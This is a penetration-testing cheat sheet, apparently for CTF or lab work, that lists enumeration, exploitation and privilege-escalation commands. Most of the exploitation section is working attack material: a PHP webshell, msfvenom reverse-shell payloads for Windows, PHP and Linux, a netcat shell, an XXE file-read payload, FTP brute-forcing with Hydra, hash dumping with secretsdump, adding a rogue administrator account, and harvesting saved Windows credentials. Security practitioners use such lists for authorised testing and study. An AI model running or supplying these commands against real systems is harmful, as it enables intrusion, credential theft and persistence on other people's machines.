########## ENUMERATION ##########
 
*** scan for open ports***  
nmap -vv -sS -Pn -oN <IP>.nmap -p- <IP>
 
*** scan for services/vulnerabilities ***  
nmap -vv -sC -sV --script=vuln -p <port,port> <IP>
 
*** enumerate smb shares ***  
enum4linux -a <IP>  
smbclient -L [\\\\<ip>\\](file:///\\\\<ip>\\)
 
*** enumerate web subdomains ***  
sublist3r -d <IP>
 
*** enumerate web server ***  
nikto -h <IP>
 
*** find web directories ***  
gobuster dir -u <IP> -w /usr/share/wordlists/dirb/common.txt
 
*** get domain info ***  
whatweb <IP>
 
*** send 1 packet to port 80 ***  
hping3 –A –p80 –c1 <IP>
 
*** create password list from webpage ***  
cewl -d 1 -m 5 wordlist.txt <IP>
 
*** find emails on webpage ***  
cewl <IP> -n -e
 
*** port knocking ***  
for PORT in 1111 2222 3333 4444; do nc -vz <IP> $PORT; done;
 
########## EXPLOITATION ##########
 
*** php webshell in url  
<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>'; ?>
 
*** rdp into windows host  
xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:<IP> /u:USERNAME /p:'PASSWORD'
 
*** remote shell  
ssh <user>@<IP>
 
*** list msfvenom payloads  
msfvenom --list payloads
 
*** .exe reverse shell  
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f exe > win_shell.exe
 
*** php reverse shell  
msfvenom -p php/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f raw -e php/base64 > payload.php
 
*** linux reverse shell  
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f elf > rev_shell.elf*** bind a shell  
nc <IP> 4444 -e /bin/bash
 
*** netcat listener  
nc -nlvp 4444
 
*** crack password with john  
john --format=(raw-md5/raw-sha1/nt/sha512crypt) --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
 
*** xxe: read /etc/passwd  
<?xml version='1.0'?>  
<!DOCTYPE root [<!ENTITY read SYSTEM '[file:///etc/passwd](file:///etc/passwd)'>]>  
<root>&read;</root>
 
*** test for xxs ***  
<script>alert(“Hello World”)</script>
 
*** crack an md5 (or change -m) hash ***  
hashcat -a 0 -m 0 -r <hash file> <wordlist>
 
*** view smb share ***  
smbclient //<IP>/<share> -U Anonymous
 
*** ftp login ***  
ftp <IP>
 
*** start python server ***  
python3 -m http.server 4444
 
*** brute force ftp password ***  
hydra -t 4 -l <username> -P /usr/share/wordlists/rockyou.txt -vV <IP> ftp
 
*** enumerate nfs mounts ***  
showmount -e <IP>  
mkdir /tmp/mount  
sudo mount -t nfs <IP>:<share> /tmp/mount/ -nolock
 
*** find windows users with kerbrute ***  
./kerbrute userenum -d <DOMAIN>.local --dc <DOMAIN>.local /user.txt
 
*** ^ then, check if users are asreproastable ***  
python3 /opt/impacket/examples/GetNPUsers.py -usersfile user.txt <DOMAIN>.local/svc-admin -no-pas
 
########## Privilege Escalation ##########
 
*** find linux SUID files ***  
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
 
*** find sudoable commands in linux ***  
sudo -l
 
*** dump windows hashes with user acct ***  
python3 /opt/impacket/examples/secretsdump.py -just-dc <username>@<IP>
 
*** check for windows passwds ***  
C:\Windows\System32\Config\SAM
 
*** search files in windows ***  
Get-Childitem –Path C:\ -Include <FILE> -Recurse -ErrorAction SilentlyContinue
 
*** add new admin user in windows ***  
net user <username> <password> /add & net localgroup administrators <username> /add
 
*** windows cmd history ***  
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
 
*** windows powershell history ***  
type $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
 
*** windows saved creds ***  
cmdkey /list  
runas /savecred /user:<user> cmd.exe
 
*** windows web server database for creds ***  
type C:\Windows\Microsoft.NET\Framework64  
4.0.30319\Config\web.config | findstr connectionString  
type C:\inetpub\wwwroot\web.config | findstr connectionString
 
*** windows PuTTY proxy Config File ***  
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f 'Proxy' /s
 
*** get windows services info ***  
wmic product get name,version,vendor
 
*** check windows services for vulns ***  
sc qc